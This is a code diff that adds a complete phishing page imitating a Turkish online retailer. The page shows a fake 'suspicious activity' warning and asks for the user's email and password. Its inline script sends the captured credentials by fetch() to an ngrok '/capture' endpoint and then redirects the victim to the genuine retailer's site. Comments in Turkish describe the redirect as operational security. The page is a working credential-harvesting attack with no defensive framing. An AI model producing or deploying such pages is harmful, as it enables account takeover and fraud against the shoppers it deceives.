@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Suspicious Activity Detected - Trendway</title>
+    <style>
+        /* CSS ve Gömülü SVG Logo burada yer alıyor */
+        body { font-family: Arial, sans-serif; background-color: #f6f6f6; margin: 0; padding: 0; }
+        .container { 
+            background-color: #ffffff; margin: 50px auto; padding: 20px; 
+            max-width: 600px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); 
+        }
+        /* ... Diğer CSS stilleri (header, logo, input-field, button vb.) ... */
+        .header { 
+            text-align: center; padding: 20px 0; border-bottom: 1px solid #eee;
+        }
+        .logo { 
+            width: 300px; display: block; margin: 0 auto;
+        }
+        .content { 
+            padding: 20px 0; text-align: left; 
+        }
+        .form-area { 
+            background-color: #fff; padding: 30px; border: 1px solid #ddd; 
+            border-radius: 6px; 
+        }
+        .input-field { 
+            width: 90%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; 
+            border-radius: 4px; box-sizing: border-box; 
+        }
+        .button { 
+            background-color: #F27A1A; color: white; padding: 14px 20px; 
+            margin: 8px 0; border: none; cursor: pointer; width: 90%; 
+            border-radius: 4px; font-weight: bold; text-decoration: none; 
+            display: inline-block; text-align: center;
+        }
+        /* SVG logo stili */
+        .logo-svg text { font-family: Arial, sans-serif; font-size: 16px; }
+
+    </style>
+</head>
+
+<body>
+    <div class="container">
+
+        <div class="header">
+            <svg class="logo logo-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 50">
+                <rect x="0" y="10" width="200" height="30" fill="#F27A1A" rx="6"/>
+                <text x="50%" y="50%" dominant-baseline="middle"
+                    text-anchor="middle" fill="white">
+                    trendway
+                </text>
+            </svg>
+        </div>
+
+        <div class="content">
+            <h2 style="color: #F27A1A;">Suspicious Activity Detected in Your Account!</h2>
+            <p>Dear Customer,</p>
+            <p>
+                An unusual login attempt from <b>a different geographical location</b> 
+                has been detected in your account within the last 24 hours. 
+                To protect your account from unauthorized actions, 
+                your access has been temporarily restricted for your security.
+            </p>
+
+            <div class="form-area">
+                <p style="font-weight: bold; color: #333;">
+                    To remove the restriction, please re-verify your information:
+                </p>
+                
+                <form id="phishing-form" action="" method="POST"> 
+                    <input type="email" name="eposta" placeholder="Your Email Address" 
+                           class="input-field" required>
+
+                    <input type="password" name="sifre" placeholder="Your Password" 
+                           class="input-field" required>
+
+                    <button type="submit" class="button">Log In to Remove Restriction</button>
+                </form>
+            </div>
+
+            <p style="font-size: 12px; color: #999; margin-top: 30px;">
+                © 2025 Trendway Consulting Inc.
+            </p>
+        </div>
+        
+        <script>
+            // Ngrok URL'niz ve hedef yönlendirme
+            const CAPTURE_URL = 'https://lonny-travelled-macrobiotically.ngrok-free.dev/capture';
+            const REDIRECT_URL = 'https://www.trendyol.com/'; 
+            
+            document.addEventListener('DOMContentLoaded', () => {
+                const form = document.getElementById('phishing-form');
+                
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault(); // Varsayılan gönderimi durdur (CORS engellemesini aşmak için)
+                    
+                    const formData = new FormData(form);
+                    const data = new URLSearchParams(formData); // Flask'ın form verisini okuyacağı format
+
+                    // 1. Veriyi Asenkron (JS) ile Ngrok'a (Flask) GÖNDER
+                    fetch(CAPTURE_URL, {
+                        method: 'POST',
+                        body: data 
+                    })
+                    .then(response => {
+                        // 2. Başarılı veya hatalı olsun, OpSec gereği kurbanı hemen yönlendir.
+                        window.location.href = REDIRECT_URL;
+                    })
+                    .catch(error => {
+                        // Ağ hatası durumunda bile yönlendir (OpSec)
+                        console.error('Veri gönderim hatası:', error);
+                        window.location.href = REDIRECT_URL;
+                    });
+                });
+            });
+        </script>
+
+    </div>
+</body>
+</html>
